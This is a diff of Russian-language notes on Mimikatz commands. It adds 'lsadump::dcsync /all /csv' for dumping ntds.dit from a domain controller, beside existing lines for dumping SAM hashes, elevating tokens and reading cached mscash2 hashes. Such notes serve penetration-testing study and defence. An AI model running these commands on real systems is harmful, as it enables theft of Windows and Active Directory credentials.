@@ -29,7 +29,7 @@ lsadump::sam /system:C:\Share-Server\files\SYSTEM /sam:C:\Share-Server\files\SAM
 - `token::elevate` - поднимает привилегии на максимальный уровень.
 - `token::whoami` - выводит информацию о текущем пользователе.
 -  lsadump::cache - mscash2 последних 10 пользователей из систем и секьюрити
-
+- lsadump::dcsync /all /csv - дампим ntds.dit с контроллера
 Подробнее: https://www.securitylab.ru/analytics/517178.php
 
 Для получения данных из ntds.dit, аналогично команде lsadump::sam в инструменте Mimikatz, можно использовать следующие команды:
